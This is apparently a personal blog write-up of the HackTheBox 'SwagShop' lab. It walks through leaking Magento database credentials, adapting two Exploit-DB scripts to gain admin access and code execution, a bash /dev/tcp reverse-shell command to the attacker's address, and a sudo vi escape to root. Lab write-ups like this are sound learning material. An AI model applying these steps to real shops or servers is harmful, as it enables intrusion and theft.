---
permalink: /posts/HTB/SwagShop
title:  "HTB SwagShop"
author: Luc Kolen
description: "SwagShop is an easy Linux machine on HTB"
categories:
  - CTF
  - HTB
tags:
  - HTB-Easy
  - Linux
  - Magento
---
# 10.10.10.140 - SwagShop

- [10.10.10.140 - SwagShop](#101010140---swagshop)
  - [Open ports](#open-ports)
  - [HTTP](#http)
    - [Magescan](#magescan)
      - [app/etc/local.xml](#appetclocalxml)
      - [index.php/rss/order/NEW/new](#indexphprssordernewnew)
      - [shell/](#shell)
    - [Exploit db](#exploit-db)
      - [Fixing the exploit](#fixing-the-exploit)
  - [Privilege escalation](#privilege-escalation)
  - [TL;DR](#tldr)

## Open ports

```bash
luc@kali:~/HTB/SwagShop$ nmap -vv --reason -Pn -A --osscan-guess --version-all -p- 10.10.10.140
```

|Port|Service|Version
|---|---|---|
22/tcp|ssh|OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp|http|Apache httpd 2.4.18 ((Ubuntu))

## HTTP

We can see that this webpage is showing a Magento webshop

### Magescan

```bash
luc@kali:~/HTB/SwagShop$ php /opt/magescan-binaries/magescan.phar scan:all http://10.10.10.140/index.php/
...
+-----------+-----------+
| Parameter | Value     |
+-----------+-----------+
| Edition   | Community |
| Version   | 1.9       |
+-----------+-----------+
...
+--------+------------------------+
| Key    | Value                  |
+--------+------------------------+
| Server | Apache/2.4.18 (Ubuntu) |
+--------+------------------------+
...
  Patches  

+------------+---------+
| Name       | Status  |
+------------+---------+
| SUPEE-5344 | Unknown |
| SUPEE-5994 | Unknown |
| SUPEE-6285 | Unknown |
| SUPEE-6482 | Unknown |
| SUPEE-6788 | Unknown |
| SUPEE-7405 | Unknown |
| SUPEE-8788 | Unknown |
+------------+---------+
...
+----------------------------------------------+---------------+--------+
| Path                                         | Response Code | Status |
+----------------------------------------------+---------------+--------+
...
| app/etc/local.xml                            | 200           | Fail   |
...
| index.php/rss/order/NEW/new                  | 200           | Fail   |
...
| shell/                                       | 200           | Fail   |
```

We can that [magescan](https://github.com/steverobbins/magescan) resulted in a few interesting results. The patch status is unknown so we'll ignore that for now.

#### app/etc/local.xml

```xml
<config>
  <global>
    <install>
      <date><![CDATA[Wed, 08 May 2019 07:23:09 +0000]]></date>
    </install>
    <crypt>
      <key><![CDATA[b355a9e0cd018d3f7f03607141518419]]></key>
    </crypt>
    <disable_local_modules>false</disable_local_modules>
    <resources>
      <db>
        <table_prefix><![CDATA[]]></table_prefix>
      </db>
      <default_setup>
        <connection>
          <host><![CDATA[localhost]]></host>
          <username><![CDATA[root]]></username>
          <password><![CDATA[fMVWh7bDHpgZkyfqQXreTjU9]]></password>
          <dbname><![CDATA[swagshop]]></dbname>
          <initStatements><![CDATA[SET NAMES utf8]]></initStatements>
          <model><![CDATA[mysql4]]></model>
          <type><![CDATA[pdo_mysql]]></type>
          <pdoType><![CDATA[]]></pdoType>
          <active>1</active>
        </connection>
      </default_setup>
    </resources>
    <session_save><![CDATA[files]]></session_save>
  </global>
  <admin>
    <routers>
      <adminhtml>
        <args>
          <frontName><![CDATA[admin]]></frontName>
        </args>
      </adminhtml>
    </routers>
  </admin>
</config>
```

This file is accessible and gives us the database username `root` and password `fMVWh7bDHpgZkyfqQXreTjU9`.

#### index.php/rss/order/NEW/new

This is just a RSS feed with new orders, while it's something you don't want in a live environment, this won't help us access the box.

#### shell/

This directory has 4 files, abstract.php compiler.php indexer.php log.php. None of which help us gain access

### Exploit db

```bash
luc@kali:~/HTB/SwagShop$ searchsploit Magento 1.9
...
eBay Magento 1.9.2.1 - PHP FPM XML eXternal Entity Injection                            | php/webapps/38573.txt
eBay Magento CE 1.9.2.1 - Unrestricted Cron Script (Code Execution / Denial of Service) | php/webapps/38651.txt
Magento < 2.0.6 - Arbitrary Unserialize / Arbitrary Write File                          | php/webapps/39838.php
Magento CE < 1.9.0.1 - (Authenticated) Remote Code Execution                            | php/webapps/37811.py
...
luc@kali:~/HTB/SwagShop$ searchsploit Magento
...
Magento eCommerce - Remote Code Execution                                               | xml/webapps/37977.py
...
```

Magescan showed that the version of Magento is 1.9, but searching for `magento 1.9` didn't give any usable results. Searching without the version number resulted in an interesting sounding exploit, [37977 - Magento eCommerce - Remote Code Execution](https://www.exploit-db.com/exploits/37977). This exploit mentions is a [blog post by Check Point](https://blog.checkpoint.com/2015/04/20/analyzing-magento-vulnerability/) which mentions that patch `SUPEE-5344` fixes this issue. Looking back we could see this patch (and others) were mentioned in our Magescan result, maybe we shouldn't have ignored it.

```bash
luc@kali:~/HTB/SwagShop$ searchsploit -m xml/webapps/37977.py
luc@kali:~/HTB/SwagShop$ nano 37977.py
...
target = "http://10.10.10.140/"
...
luc@kali:~/HTB/SwagShop$ python 37977.py
DID NOT WORK
```

#### Fixing the exploit

We can use Burp suite to investigate why this exploit didn't work.

![Add proxy listener - binding](/assets/images/HTB-SwagShop/1.a%20Add%20proxy%20listener%20binding.png)

![Add proxy listener - request handling](/assets/images/HTB-SwagShop/1.b%20Add%20proxy%20listener%20request%20handling.png)

```bash
luc@kali:~/HTB/SwagShop$ nano 37977.py
...
target = "http://127.0.0.1:8081"
...
```

We now have Burp Suite listening on port `8081` and all traffic will be send to `10.10.10.140:80`.

![404 when accessing admin page](/assets/images/HTB-SwagShop/1.c%20404%20when%20accessing%20admin%20page.png)

The reason the exploit didn't work was because of a `404 Not Found` error. The exploit expects the admin pages to be at `/admin`, but all pages on the shop are prefixed with `index.php`.

```bash
luc@kali:~/HTB/SwagShop$ nano 37977.py
...
target_url = target + "/index.php/admin/Cms_Wysiwyg/directive/index/"
...
luc@kali:~/HTB/SwagShop$ python 37977.py
WORKED
Check http://127.0.0.1:8081/admin with creds forme:forme
```

Rerunning the exploit with the updated target does result in a successful exploitation of this vulnerability and we now have an admin account on the Magento webshop. We can confirm this by going to the `http://10.10.10.140/index.php/admin/` page and entering the username `forme` and password `forme`.

System -> Permissions -> Users shows us a list of all Magento users. Here we find our own account and another account named `haris`.

We can now use [37811 - Magento CE < 1.9.0.1 - (Authenticated) Remote Code Execution](https://www.exploit-db.com/exploits/37811) we found earlier, but dismissed because we didn't have user credentials.

```bash
luc@kali:~/HTB/SwagShop$ searchsploit -m php/webapps/37811.py
luc@kali:~/HTB/SwagShop$ nano 37811.py
...
# Config.
username = 'forme'
password = 'forme'
php_function = 'system'  # Note: we can only pass 1 argument to the function
install_date = 'Wed, 08 May 2019 07:23:09 +0000'  # This needs to be the exact date from /app/etc/local.xml
...
luc@kali:~/HTB/SwagShop$ python 37811.py
Usage: python %s <target> <argument>
Example: python %s http://localhost "uname -a"
luc@kali:~/HTB/SwagShop$ python 37811.py 'http://10.10.10.140/index.php/admin' "whoami"
Traceback (most recent call last):
  File "37811.py", line 69, in <module>
    tunnel = tunnel.group(1)
AttributeError: 'NoneType' object has no attribute 'group'
```

We can now run our exploit, but we get an error on line 69.

```bash
luc@kali:~/HTB/SwagShop$ nano 37811.py
...
67 request = br.open(url + 'block/tab_orders/period/7d/?isAjax=true', data='isAjax=false&form_key=' + key)
68 tunnel = re.search("src=\"(.*)\?ga=", request.read())
69 tunnel = tunnel.group(1)
```

![No data in order search](/assets/images/HTB-SwagShop/1.d%20No%20data%20in%20order%20search.png)

We can look out the exploit code to see what request was done last and we can also see that request in Burp Suite. The URL path includes `7d` which is a filter for 7 days. This machine didn't have any activity that matches this filter so no we get the `No Data Found` message in our response. Changing `7d` to `2y` will make it filter over a period of 2 years.

```bash
luc@kali:~/HTB/SwagShop$ python 37811.py 'http://10.10.10.140/index.php/admin' "whoami"
www-data
```

We now finally have achieved code execution.

```bash
luc@kali:~/HTB/SwagShop$ python 37811.py 'http://10.10.10.140/index.php/admin' 'bash -c "bash -i >& /dev/tcp/10.10.14.16/80 0>&1"'
```

```bash
luc@kali:~/HTB/SwagShop$ sudo nc -lnvp 80
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 10.10.10.140.
Ncat: Connection from 10.10.10.140:40268.
bash: cannot set terminal process group (1282): Inappropriate ioctl for device
bash: no job control in this shell
www-data@swagshop:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@swagshop:/var/www/html$ cd /home/haris/
www-data@swagshop:/home/haris$ cat user.txt
a4488772************************
```

## Privilege escalation

```bash
www-data@swagshop:/home/haris$ sudo -l
Matching Defaults entries for www-data on swagshop:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on swagshop:
    (root) NOPASSWD: /usr/bin/vi /var/www/html/*
www-data@swagshop:/home/haris$ ls -lsa /usr/bin/vi
0 lrwxrwxrwx 1 root root 20 May  2  2019 /usr/bin/vi -> /etc/alternatives/vi
www-data@swagshop:/home/haris$ ls -lsa /etc/alternatives/vi
0 lrwxrwxrwx 1 root root 18 May  2  2019 /etc/alternatives/vi -> /usr/bin/vim.basic
www-data@swagshop:/home/haris$ ls -lsa /usr/bin/vim.basic
2384 -rwxr-xr-x 1 root root 2437320 Nov 24  2016 /usr/bin/vim.basic
```

`www-data` is allowed to run `/usr/bin/vi /var/www/html/*` as root without supplying a password. We can also see that `/usr/bin/vi` is actually `/usr/bin/vim.basic`. We also know that it's possible to break out of `vim` to get a shell as the user running `vim` ([GTFOBins](https://gtfobins.github.io/gtfobins/vim/)).

```bash
www-data@swagshop:/home/haris$ sudo /usr/bin/vi /var/www/html/*
...
:!/bin/bash
...
root@swagshop:/home/haris# id
uid=0(root) gid=0(root) groups=0(root)
root@swagshop:/home/haris# cat /root/root.txt
c2b087d6************************

   ___ ___
 /| |/|\| |\
/_| ´ |.` |_\           We are open! (Almost)
  |   |.  |
  |   |.  |         Join the beta HTB Swag Store!
  |___|.__|       https://hackthebox.store/password

                   PS: Use root flag as password!
```

## TL;DR

- Vulnerable Magento version
- User can run vi/vim as root
